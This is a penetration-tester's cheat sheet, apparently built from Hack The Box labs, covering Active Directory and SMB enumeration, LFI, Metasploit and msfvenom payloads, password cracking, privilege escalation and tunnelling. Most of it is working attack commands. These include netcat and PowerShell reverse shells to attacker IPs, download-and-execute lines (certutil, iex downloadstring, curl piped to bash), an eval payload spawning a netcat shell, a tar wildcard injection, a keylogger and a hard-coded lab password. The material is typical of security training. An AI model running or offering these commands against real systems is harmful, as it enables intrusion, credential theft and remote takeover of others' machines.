- LDAP powershell:
```powershell
$ import-module activedirectory
$ get-adobject -LDAPFilter "(objectclass=user)" (get users & computers)
$ get-adobject -LDAPFilter "(&(!(objectclass=computer)(objectclass=user)))" (get users)
$ get-adobject -LDAPFilter "(samaccountname=svc*)" (user that start with svc)
$ get-adobject -LDAPFilter "(objectclass=user)" -Properties cn,description,objectsid (filter properties)
```
- AD Group Policies:
```powershell
SYSVOL Share: \\<domain\SYSVOL\Policies
$  get-aduser <user> -Properties memberof
```
- AD ACLs:
```powershell
$ dsacls DC=htb,DC=local (domain permissions)
$ get-acl
$ get-acl | select-object -ExpandProperty Access
```
- LDAP enum python script: https://github.com/ropnop/windapsearch

```sh
#dependencies:
$ sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev
$ pip3 install -r requirements.txt
$  windapsearch.py -d <target> --functionality #(find ldap servers and their functionality)
$  windapsearch.py -d <target> -C #(enumerate computers)
$  windapsearch.py -d <target> -U #(enumerate users)
$  windapsearch.py -d <target> -l <fuzz> #(fuzz for anything)
$  windapsearch.py -d <target> -u <user>@<domain> -p <password> --unconstrained-computers
$  windapsearch.py -d <target> -u <user>@<domain> -p <password> --admin-objects
$  windapsearch.py -d <target> -u <user>@<domain> -p <password> -m "Group Whatever"  #(group members)
```

- nmap script:
```sh
$ nmap -Pn -p 389 --script ldap-search <target>
```
- Domain metadata:
```sh
$ ldapsearch -LLL -x -H ldap://<target> -b '' -s base '(objectclass=*)'
```
- MS-RPC:
	- Windows:
		- net user <user> /domain
		- open SMB connection to domain
		- request IPC$ share
		- Bind to samr (Security Account Manager Remote) named pipe
		- Makes multiple SAMR queries (EnumDomains, LookupNames etc.)
	- Linux: (rpcclient, smbclient, impacket etc.)
		- [impacket static binaries](https://github.com/ropnop/impacket_static_binaries)

- Ldap null session:
```sh
$ smbclient -L \\\\<target>\\ -U <user>%<hash> --pw-nt-hash #(list shares)
$ smbclient \\\\<target\\<share> -U <user>%<hash> --pw-nt-hash #(connect)
$ smbclient -N -L \\\\<target> #(prompt for password)
```

### `Kibana`
http://localhost:5601/api/status (version)

### `LFI`
- tests:
	- windows: /windows/win.ini
	- linux: /etc/passwd
- relative:
	param=../../../windows/win.ini
- absolute:
	param=/windows/win.ini
- LFI to RCE:
	- https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/
	- https://dl.packetstormsecurity.net/papers/general/lfi-testing.pdf
- PHP Wrappers:
	- `expect` (allows execution of system commands, not enabled by default)
	- `filter` (include local files and base64 encodes the output)
	- `input`  (allows you to read raw data from the request body)
SSRF (mantis htb)		

### `Malware Analysis`

- [speakeasy](https://github.com/fireeye/speakeasy) - portable, modular, binary emulator designed to emulate Windows kernel and user mode malware.

### `Masscan`
```sh
$ masscan -p1-65535 <target> --rate=1000 -e <interface> > file
$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//' )
$ nmap -Pn -sV -sC -p $ports <target>
```

### `mdbtools`
extract data from `Microsoft Access` files
```sh
$ apt-get install mdbtools
$ mdb-tables file.mdb | grep --color=auto user
$ mdb-export file.mdb <table>
```

### `Metadata`
```sh
$ exiftool file
```

### `Metasploit/Meterpreter`
- `pre-start`:
```sh
$ msfdb init
$ systemctl enable postgresql
```
- `search`:
```sh
msf> search platform:windows
msf> search ms15-001
msf> search cve:2019 type:exploit
```
- `db_nmap`:
```sh
# Use workspaces to separate different scans
msf> workspace --add <name>
msf> db_nmap -Pn -pn -n -v <target>/<cidr>
msf> db_nmap -sV -sC -Pn -n -v -p <port-list> <target>
# identified services and hosts are saved in the workspace
msf> services
msf> hosts
```
- `post exploit` "Multi Recon Local Exploit Suggester": 
```sh
msf> use post/multi/recon/local_exploit/suggester
msf> set session <id>
msf> run
```
- `Download` files from victim:
```sh
msf> download /path/to/file /local/path
```
- `Migrate`:
1. 
```sh
meterpreter> ps -S <process name>
meterpreter> ps
meterpreter> migrate <pid>
meterpreter> migrate <pid> -t <seconds>
```
2. 
```sh
use post/windows/manage/migrate
msf post(windows/manage/migrate)>set session 1
msf post(windows/manage/migrate)> run
```
- `keylogger`:
```sh
meterpreter> keyscan_start/stop
meterpreter> keyscan_dump
```
- `Interactive shell` (if shell command doesnt work):
```sh
meterpreter> execute -i -f /bin/bash
```
- `Web delivery exploit`: (upgrade shell to meterpreter with target PSH)
```sh
msf> use exploit/multi/script/web_delivery #(run a server that will upload a payload to victim, command to run at victim shown after running exploit)
msf> exploit(multi/script/web_delivery) set target 1 #(2 - powershell: good way to spawn a meterpreter shell from another shell)
msf> exploit(multi/script/web_delivery) set payload php/meterpreter/reverse_tcp
msf> exploit(multi/script/web_delivery) set lhost <kali>
msf> exploit(multi/script/web_delivery) set lport <port>
msf> exploit(multi/script/web_delivery) exploit
```

- `Powershell meterpreter`:
```sh
meterpreter> load powershell
meterpreter> powershell_shell
```
- `SMB meterpreter delivery` (from an already obtained non meterpreter shell):
```sh
msf> use exploit/windows/smb/smb_delivery
msf> set SRVHOST <kali>
msf> set payload windows/x64/meterpreter/reverse_https
msf> set LPORT 443
msf> set LHOST <kali>
msf> exploit #(run command created to victim)
```
- `SMB delivery 2`:
```sh
msf> user exploit/windows/smb/smb_delivery
msf> set SRVHOST <kali>
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST <kali>
msf> set LPORT <port>
msf> exploit
```
```sh
#Route must be added if SMB is not open to the network
msf> route add <target>/32 255.255.255.255 <session-id>
msf> use auxilliary/admin/smb/psexec_command
msf> set COMMAND C:\path\to\nc64.exe <kali-ip> <port> -e cmd.exe
msf> set SMBPass <admin-pass>
msf> set SMBUser Administrator
```
- wordpress reverse shell plugin upload:
```sh
msf> use exploit/unix/webapp/wp_admin_shell_upload
msf> set rhost <target>
msf> set username <username>
msf> set password <pwd>
msf> exploit
```
- `SNMP` enumeration:
```sh
msf > use auxiliary/scanner/snmp/snmp_enum	
msf auxiliary(scanner/snmp/snmp_enum) > set rhosts <target>
msf auxiliary(scanner/snmp/snmp_enum) > set threads 5
msf auxiliary(scanner/snmp/snmp_enum) > exploit
```
- `Squid pivot` scanning:
```sh
msf> use auxiliary/scanner/http/squid_pivot_scanning
msf> set RHOSTS <address>
msf> set RPORT 3128
msf> set RANGE <addresses>
```
- `Oracle` metasploit modules:
```sh
msf > use auxiliary/admin/oracle/sid_brute
msf auxiliary(admin/oracle/sid_brute) > set rhosts
msf auxiliary(admin/oracle/sid_brute) > run
msf > use auxiliary/admin/oracle/oracle_login
msf auxiliary(admin/oracle/oracle_login) > set sid <from sid_brute>
msf auxiliary(admin/oracle/oracle_login) > set rhost
msf auxiliary(admin/oracle/oracle_login) > run
```

- `Kiwi`:
```sh
meterpreter> load kiwi
meterpreter> creds_all
```

### `Msfvenom`

- `cheat sheets`:
	- https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/
	- https://netsec.ws/?p=331

- Basic Usage

```sh
$ msfvenom -p php/meterpreter/reverse_tcp lhost=<kali-ip> lport=<port> -f <format> > file
$ msfvenom --list archs
$ msfvenom --list formats
$ msfvenom --list payloads
```

- Msfvenom (buffer overflow, embedded payload):
```sh
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=<lhost> lport=<lport> -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp lhost=<lhost> lport=<lport> -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
$ msfvenom -p python/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/python.py
$ msfvenom -p php/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f raw > file.php
```

### `Microsoft Outlook`

Personal Folder file:

```sh
$ aptget install pst-utils # (mails)
$ readpst -tea -m file.pst # (extract mails)
# creates mbox file that can be opened with evolution/thunderbird
$ apt-get install evolution
$ evolution file.mbox
# open inbox
```

### `Netcat`
```sh
nc -nvlp <port>	# (listen)
nc <address> <port> -e /bin/bash #(connect)
nc.exe <address> <port> -e cmd.exe #(connect windows)
```
- Netcat `statically` linked:
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat


### `NFS`
```sh
apt-get install nfs-common
showmount -e <target> #(shared files and folders on target)
mount -t nfs <target>:/path/to/share /path/to/mount/folder
```
`NFS nmap`
```sh
nmap -p <port> --script=nfs-ls,nfs-statfs,nfs-showmount <target>
```

`CIFS`
```sh
mount -t cifs -o rw,username=guest,password= '//<target>/Share' /mnt
```


### `Nmap`
- basic scans
```sh
$ nmap -Pn -n -v <target>/<cidr> #(-Pn: port scan only skip ping sweep, -n: no DNS resolution)
$ nmap -sS -Pn -n -p- <target> #(-sS: stealth scan)
$ nmap -PR <target> #(arp scan)
$ nmap -sV -sC -Pn -n -v -p port1,port2,..portN <target>
```
- nmap output
```sh
$ nmap <target> -oN out.txt
$ nmap <target> -oX out.xml
```
- http:
```sh
$ nmap -sV -p 80 --script http-methods,http-enum <target>
```

- nmap automator:

https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh

- heartbleed vulnerability check:
```sh
$ nmap –p 443 --script ssl-heartbleed <target>
$ searchsploit -m 32745.py
msf> use auxilliary/scanner/ssl/openssl_heartbleed
msf> set RHOST
msf> set action SCAN/DUMP/KEYS
```
- Windows host enum
```sh
$ nmap <target> -script smb-os-discovery.nse
```

### `Nikto`
```sh
$ nikto -h <address>
$ nikto -h <address> -p <port>
$ nikto -h https://<address>:<port>/
$ nikto -h <address> -p <port> -ssl
$ nikto -id user:pass -h <address> # base auth
```

### `OSINT`

https://github.com/jivoi/awesome-osint

https://www.whois.net/

http://whois.domaintools.com/

https://hunter.io

https://burrrd.com (twitter)

https://shodan.io (servers, routers, webcams, firewalls, IoT devices, ICS)

https://www.exploit-db.com/google-hacking-database

https://www.wigle.net/ (bssid, ssid)

- nslookup:
```sh
nslookup <domain>
nslookup -type=A <domain> #(host records)
nslookup -type=soa <domain> #(Start of Authority records)
nslookup -query=MX <domain> #(mail servers)
nslookup -type=ns <domain>  #(dns servers)
nslookup <domain> <dns-server> #(lookup using dns server)
nslookup -query=any <domain>	#(all dns records)
```
- theharverster:
```sh
$ theharvester -d <domain> -l <limit> -b <data-source>
```
- recon-ng
	https://geekwire.co.uk/recon-ng-v5-tutorial/
	- v4:
```sh
[recon-ng][default] > show modules
[recon-ng][default] > keys list #(show available APIs to extract info)
[recon-ng][default] > use recon/domains-hosts/hackertarget #(subdomains and ip addresses)
[recon-ng][default] > set SOURCE <domain>
[recon-ng][default] > run
```		
		
### `Password Cracking`

```sh
$ hash-identifier
```
https://hashkiller.co.uk/
https://crackstation.net/

- `Samdump2`:
```sh
samdump2 [-d] [-o file] <system hive> <sam hive>
samdump2 -o out /mnt/ntfs/WINDOWS/system32/config/SYSTEM /mnt/ntfs/WINDOWS/system32/config/sam
```
- `hydra`:
	- https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/

hydra `http` dictionary:
```sh
$ hydra -L <USER-LIST> -P <Password-List> <IP Address> http-post-form "<Login Page>:<Request Body>:<Error Message>"
$ hydra -C <User-Pass-List> <IP Address> http-post-form "<Login Page>:<Request Body>:<Error Message>"
$ hydra -l {username} -P {password.txt} {Target IP} {method website, e.g. http-post-form} "{path login: cookie:message show when login fail}"
```
hydra `base auth` dictionary:
$ hydra -l <user> -P rockyou.txt <ip> http-get "/protected-dir"
$ hydra -l <user> -P rockyou.txt <ip> http-get "/manager/html"

hydra `ssh`
```sh
$ hydra -l jan -P rockyou.txt 10.10.148.6 ssh -V
```
hydra smb:
```sh
hydra -l jan -P rockyou.txt 10.10.148.6 smb -V
```

- `Keepass`
```sh
*.kdbx
$ keepass2john file.kdbx >> hash
$ john -w=/usr/share/wordlists/rockyou.txt hash 
$ apt install kpcli -y
$ kpcli --kdb file.kdbx --key <key>
kpcli:/> ls # (must return entries e.g.: 0 "entry name")
kpcli:/>  show 0 -f
```

- `John, hashcat`
john list formats:
```sh
john --list=formats
```
hashcat modes, examples: https://hashcat.net/wiki/doku.php?id=example_hashes

`sha1` no salt:
```sh
hashcat -m 100 -a 0 hash.txt rockyou.txt -O
john --format=Raw-SHA1 hash -w=/usr/share/wordlists/rockyou.txt
```
`sha256` no salt:
```sh
hashcat -m 1400 -a0 hash.txt rockyou.txt -O
john --format=Raw-SHA256 hash -w=/usr/share/wordlists/rockyou.txt
```
`bcrypt`: prefix "$2a$" or "$2b$" (or "$2y$")
```sh
john --format=bcrypt hash -w=/usr/share/wordlists/rockyou.txt
hashcat -m 3200 -a 0 hash wordlist -O

# generate bcrypt pwd:
python3 -c 'import bcrypt; password="password".encode("utf-8");print(bcrypt.hashpw(password, bcrypt.gensalt()))'
```
`md4`:
```sh
hashcat -m 900 -a 0 hash wordlist -O
john --format=Raw-MD4 hash -w=/usr/share/wordlists/rockyou.txt
```
`md5`:
```sh
hashcat -m 0 -a 0 hash wordlist -O
```
`ntlm`:
```sh
hashcat -m 1000 -a 0 hash wordlist -O
john --format=nt hash -w=/usr/share/wordlists/rockyou.txt
```
`sha512crypt` $6$, SHA512 (Unix):
```sh
hashcat -m 1800 -a 0 hash wordlist -O
john --format=sha512crypt hash -w=wordlist
```
```sh
john hash -w=wordlist (auto identify)
```
hmac-sha1 (`salt`): input format: <hash>:<salt>
```sh
hashcat -m -a 0 hash wordlist -O
```
word mangling:
```sh
john hash.md5 --single --format=Raw-MD5 # hash.md5: joker:7bf6d9bb82bed1302f331fc6b816aada
```

### `PHP`
- PHP web shell:
	- https://github.com/Arrexel/phpbash
- PHP disabled functions: (could give a shell)
```php
phpinfo();
disable_functions =>exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```
- PHP list directories and read file contents:
```php
scandir("/home/user");
file_get_contents("/home/user/file.txt")
file_get_contents("http://10.10.16.66:8000/remote-file.txt")
```

### `POP3/IMAP`

ports: 110/143
ssl ports: 993/995
connect to imap with openssl:

```sh
openssl s_client -connect 10.10.10.120:993
a login "user" "password"
```
View Inbox/Drafts/Sent:

```sh
a select Drafts
a select Inbox
a select Sent
```
Read a mail from Drafts:

```sh
a select Drafts
a FETCH 1 BODY[]
```

### `Port Forwarding`

After limited shell -> exploit a localhost only process

- ssh tunneling:
```sh
ssh -L <local-port>:<localhost (of target not kali\'s)>:<remote-port> <user>@<target>
```
e.g. view remote http through ssh tunnelling:
```
kali address: 10.10.14.32
ssh address: 10.10.10.109
forwarded address: 192.168.122.4:80 (seen by ssh address)
ssh -L 8000:192.168.122.4:80 user@10.10.10.109
```
e.g. port forwarding through victim
```
kali address: 10.10.14.33
ssh address: 10.10.10.96
wanted address: 172.17.0.2
on 10.10.10.96: ssh -R 10.10.14.33:9999:172.17.0.2:9000 root@10.10.14.33 -fN
on kali: localhost:9999 -> 172.17.0.2:9000
```
- aspx tunneling (htb hackback):
https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx
https://raw.githubusercontent.com/sensepost/reGeorg/master/reGeorgSocksProxy.py

### `Powershell/cmd`
```powershell
Get-ChildItem . -Force #(hidden files)
Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue  | Where { ($_.Attributes.ToString() -Split ", ") -Contains "Hidden" } | Select FullName #(hidden files - suppress errors)
dir -Force
ls -Force
arp
route
net share
fsutil fsinfo drives
net users <user>
net user /add <user> <pass> #(add a user)
net group <group> <user> /add
net localgroup <group> <user> /add
net localgroup administrators
net localgroup administrators user /add
net localgroup "Remote Management Users" <user> /add
systeminfo
cmd /c "set processor"
Get-Website
Get-Service
Get-LocalUser
Get-LocalGroup
Get-Command
Get-ExecutionPolicy #(restricted/bypass etc.)
whoami /priv  #(enumerate privileges of user)
whoami /groups #(groups of user)
```
Download with `certutil` to victim:
```bat
certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe
```
Download file:
```powershell
Invoke-WebRequest -Uri $url -OutFile $output
```
List installed software:
```bat
REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```
Search for keywords in files:
```powershell
Get-ChildItem -Path (Your Path) -Recurse -File | Select-String (Keyword)
```

Powershell reverse shell:

- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

	- Add to last line of script: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.x.x -Port 443 

- https://gist.githubusercontent.com/egre55/c058744a4240af6515eb32b2d33fbed3/raw/2c6e4a2d6fd72ba0f103cce2afa3b492e347edc2/powershell_reverse_shell.ps1

- https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1

Windows ADS technique( Windows `Alternate Data Streams`):
```bat
dir /R
more < (ADS-file-name) 	(get ADS file contents)
```

Read Alternate Data Streams from Linux:
```
smbclient -U USER //IP/Share -c 'allinfo "ADS_FILE"' followed by get "ADS_FILE:PASSWORD:$DATA" downloads the file.
```

Windows `exploit suggester`:
- https://github.com/AonCyberLabs/Windows-Exploit-Suggester

`Sherlock` (vuln check):
- https://github.com/rasta-mouse/Sherlock

`Powersploit` privilege escalation:
- https://github.com/PowerShellMafia/PowerSploit/

```powershell
powershell -ExecutionPolicy Bypass 	 	(run ps1 scripts)
Import-Module ./PowerUp.ps1 			(after uploading to victim)
Invoke-AllChecks 				(run all priv esc checks)
Get-RegistryAutoLogon				(reveal administrator autologon credentials in memory)
```

### `Privilege Escalation`

`Rotten potato` priv esc:
- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
- https://github.com/foxglovesec/RottenPotato

```sh
meterpreter> load incognito (https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)
meterpreter> list tokens -u (system not available)
meterpreter> execute -f rottenpotato.exe -Hc
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

`juicy potato`
- guide: https://hipotermia.pw/htb/conceal
- CLSID: https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise
- Requirement: `SeAssignPrimaryTokenPrivilege` and/or `SeImpersonatePrivilege` 
```bat
cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.31/rev')" > shell.bat
C:\windows\system32\spool\drivers\color\JuicyPotato.exe -p C:\windows\system32\spool\drivers\color\shell.bat -t * -l 1337 -c '{8F5DF053-3013-4dd8-B5F4-88214E81C0CF}'
```

Windows Checklists:
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
[Fuzzsecurity](https://www.fuzzysecurity.com/tutorials/16.html)
[Medium windows priv esc](https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194)

`jaws-enum` script: https://github.com/411Hall/JAWS	

```sh		
$ windows-binaries
$ windows-resources
```

`evil-winrm`
- winrm shell: 
	- https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb
	- https://github.com/Hackplayers/evil-winrm

```sh
Windows Remote management: port 5985
$ gem install evil-winrm
$ evil-winrm -i <target>-u <user> -p <password>
$ evil-winrm -i <target>-u <user> -p <password> -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
PS C:\> menu
PS C:\> Bypass-4MSI (windows defender bypass)
```

- winrm with `certificate`:
```sh
evil-winrm -i 10.10.10.103 -S -u user -p password -c certnew.cer -k amanda.key
```
- `change user`
```powershell
$pass = convertto-securestring 'password' -asplain -force
$cred = new-object system.management.automation.pscredential( 'arkham\batman' , $pass )
enter-pssession -computer arkham -credential $cred
```
- change user through `netcat`:
```powershell
PS> $password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
PS> $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
PS> Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget http://10.10.14.23/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
PS> Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.23 4444} -credential $credential;
```
- fulcrum htb `one line`
```powershell
$passwd = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('FULCRUM\923a', $passwd)
Invoke-Command -Computer File.fulcrum.local -Credential $cred -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.30',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }
```
- `bypassuac`: must be in admins group
```bat
type \\<target>\c$\users\administrator\desktop\root.txt
```

- `Cacls.exe`
Assign, display, or modify ACLs (access control lists) to files or folders.

```bat
cacls C:\Users\Administrator\Desktop 
cacls file.txt /g <group>:r
type file.txt
full control of a file:
CACLS file /e /p <user>:f
```
- `search` for files in windows: https://ss64.com/nt/where.html
```powershell
Get-ChildItem -Path C:\tomcat -Filter nc.exe -Recurse -ErrorAction SilentlyContinue -Force
where /R c:\ file.exe
```
- windows boot.ini file (windows xp, windows server 2003)
	- https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/overview-of-the-boot-ini-file
	- C:\boot.ini
- Alternate Data Streams:
	- use (upload) Sysinternals to examine Alternate Data Streams (https://docs.microsoft.com/en-us/sysinternals/downloads/streams)
```bat
C:\> streams -accepteula -s .
```	

Creating links windows: https://github.com/Plazmaz/LNKUp

Create malicious msi: https://github.com/wixtoolset/wix3/releases/tag/wix3112rtm

`Linux Enumeration`

`services`:
```sh
$ netstat -tulpn
$ ss -4 -l -n
```

[`gtfobins`](https://gtfobins.github.io/):

Examples:

```
journalctl
!/bin/sh
```
```sh
vim.tiny:
# Press ESC key
:set shell=/bin/sh
:shell
```
```sh
sudo -u <username> tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=sh
#or
kali:
msfvenom -p cmd/unix/reverse_netcat lhost=<kali> lport=<port> -f raw
victim:
mkdir dir
cd dir
echo "<reverse_netcat payload>" > test.sh
echo "" > "--checkpoint-action=exec=sh wp.sh"
echo "" > --checkpoint=1
sudo -u <user> /bin/tar cf archive.tar *
```

```sh		
id #(check userid and groups)
ls -ld #(folder user id)
groups
sudo -l 	#(list commands)
sudo -i 	#(root shell)
sudo -u <user> <command>
find / -iname *bak 2>/dev/null #(backup files)
```
`Enumeration Scripts`
1. https://github.com/diego-treitos/linux-smart-enumeration
2. https://github.com/rebootuser/LinEnum *** most common ***
3. https://github.com/mzet-/linux-exploit-suggester
4. https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

`Cronjob` exploitation
```
wrong rights, wildcard exploit, runparts
```
`Relative path` exploitation
```
relative path to a program run by root can be changed if PATH variable finds another program first (e.g. reverse shell first)
```
Exploiting `PATH` variable
```
1. strings <suid-binary> 	(relative path to a command e.g. cat)
2. PoC:
cd /tmp
echo "/bin/sh" > cat
chmod 777 cat
export PATH=/tmp:$PATH
```	
`SUID` enum:
```sh
find / -perm -u=s -type f 2>/dev/null
```
`doas` command: similar to sudo

`getcap`: get file capabilities https://www.insecure.ws/linux/getcap_setcap.html
```sh
getcap -r / 2>/dev/null
```
`sudo pip install` privilege escalation:
```sh
python reverse shell from pentest monkey > setup.py
kali: nc -nvlp 1234
victim: sudo pip install .
```
`hijack a python library` for privilege escalation:
```sh
echo 'import os;os.system("/bin/bash");' > library.py
$ sudo python program.py #(library must be included in program.py, program.py must be run as root)
```

Execute a command through `apt-get`:
```sh
$ echo 'APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};' > shell
Upload the command to /etc/apt/apt.conf.d
```
`unshadow`:
```sh
$ unshadow passwd-template shadow-template > shadow  #(then feed to hashcat/john)
$ john unshadow -w=wordlist
```
`systemctl`:
```
shell through systemctl link custom.service/ systemctl start custom.service
```
groups: `grub` (inspect kernel image)

git (bitlab): https://git-scm.com/docs/githooks#_post_merge

`lxd` privesc:
```sh
$ lxc image list
$ lxc init IMAGENAME CONTAINERNAME -c security.privileged=true
$ lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true
$ lxc start CONTAINERNAME
$ lxc exec CONTAINERNAME /bin/sh
```

`Proxychains`
```sh
$ proxychains ssh user@127.0.0.1
$ proxychains nmap -n -sT <target>
```

python proxy (onetwoseven htb example):
```sh
$ pip install twisted service_identity
```

`chisel` (tunnel between windows and kali, re htb):
- https://github.com/jpillora/chisel/releases
- https://github.com/jpillora/chisel

Example windows:
```powershell
#kali:
/root/go/bin/chisel  server -p 8000 --reverse
#windows: 
iwr -uri 10.10.14.30/chisel_windows_amd64.exe -outfile c.exe
.\c.exe client 10.10.14.30:8000 R:5985:localhost:5985
evil-winrm -i localhost -u <user> -p <pass>
```
Example linux (reddish htb):
```sh
$ curl https://i.jpillora.com/chisel! | bash
#Kali:
$ cp /usr/local/bin/chisel .
$ nc -lvnp 80 < chisel
$ /usr/local/bin/chisel server -p 8002 -reverse -v
#Victim:
$ cd /var/tmp
$ cat < /dev/tcp/<kali>/80 > chisel
$ chmod +x /var/tmp/chisel
$ /var/tmp/chisel client <kali>:8002 R:127.0.0.1:8001:172.19.0.3:80 #(access unreachable service of 172.19.0.3 through 127.0.0.1:8001)		
```

`pspy`

```
process monitoring & cronjob detection: https://github.com/DominicBreuker/pspy
```

`Python http server` module (for file uploads to victim):
```sh
python -m SimpleHTTPServer 8000
```

### `Python`
```
exploiting python apps: https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html
eval, input, exec
```

eval function exploit:
```python
var = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc lhost lport >/tmp/f')"
```

Rapid7 vuln & exploit db: www.rapid7.com/db

### `Race condition` 

example (htb smasher): https://snowscan.io/htb-writeup-smasher/#

### `Redis`

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

```sh
apt-get install redis-tools
redis-cli -h <target>
```
### `Remote Desktop` 
Remote Desktop from kali:
```sh
rdesktop
xfreerdp
```

### `Reverse shells`
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- http://pentestmonkey.net/category/tools/web-shells
- https://github.com/sameera-madushan/Print-My-Shell

### `Reverse Engineering`

- VisualBasic: http://devextras.com/decompiler/ (VB decompiler)
- Python: pip install uncompyle6 (python decompiler)
- x32/64 debugger: https://x64dbg.com/#start
- ghidra: https://www.nsa.gov/resources/everyone/ghidra/
- .NET: https://github.com/0xd4d/dnSpy
- java:
	- https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html (Debugger)
	- https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html

### `rpcclient` 
enumeration:
```sh
$ rpcclient <target> -U <user>
rpcclient $> srvinfo
rpcclient $> lookupnames <name>
rpcclient $> queryuser 500 (Administrator)
rpcclient $> enumdomusers (list of users)
rpcclient $> enumalsgroups domain/builtin (builtin/domain groups)
rpcclient $> lsaenumsid (LSA SIDs)
$ rpcclient <target> -U%
rpcclient $> enumdomusers
```

### `Rsync`
htb zetta

### `Searchsploit`

```sh
$ searchsploit -m <exploit-pattern>
```

### Serial analysis

- [Logic2 serial analyzer Linux](https://downloads.saleae.com/logic2/Logic-2.3.33-master.AppImage)
- [walkthrough ctf CyberApocalypse2021](https://kashmir54.github.io/ctfs/CyberApocalypse2021/)

### `Shells` 
spawn & upgrade:
1. with python:
```sh
$ python -c "import pty;pty.spawn('/bin/bash')"
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```
2. with perl:
```sh
$ sudo /usr/bin/perl -e 'exec "/bin/sh"'
```
3. with socat: https://github.com/aledbf/socat-static-binary/releases
```sh
#kali:
socat -,raw,echo=0 tcp-listen:4444
#victim: 
./socat exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane tcp:<host>:<port> #(upload socat binary locally)
```
4. script:
```sh
script -qc /bin/bash /dev/null
```
5. Fully interactive shell: https://www.boiteaklou.fr/Fully-interactive-reverse-shell.html

```
steps:
a. spawn pty: $ python -c 'import pty; pty.spawn("/bin/bash");'
b. Resizing and tab completion:
- Background your reverse shell with CTRL+Z.
- Print the size of your host terminal: stty -a |cut -d';' -f2-3 | head -n1.
- Transfer local hotkeys to the remote shell: stty raw -echo
- Bring the reverse shell back to foreground: fg. You may need to hit ENTER after this command.
- Inside the remote shell, adjust the size: stty rows <ROWS> cols <COLS>.
c. Adding some color: export TERM=xterm-256color
```

```
or:
# In the reverse shell
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
# In Parrot/Kali
stty raw -echo
fg
reset
xterm
# In the reverse shell
export SHELL=bash
export TERM=xterm-256color
stty rows 24 columns 150
```

### `SFTP`
```sh
$ sftp user@<target>
sftp> get/put <file>
sftp> symlink /etc/passwd/ passwd
```

### `SIP`
```sh
svmap <network>/<cidr> -v
svwar -e<user-extension-start>-<user-extension-end> <PBX> (gather extension info)
inviteflood <interface> <user> <phone-ip> <pbx-ip/phone-ip> -a "Impersonate" <number-of-packets>
```

### `SMB`
- discovery:
```sh
use auxiliary/scanner/smb/smb2
use auxiliary/scanner/smb/smb1
use auxiliary/scanner/smb/smb_version
$ smbmap -H <target>
```
- nmap:
```sh
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target>
```
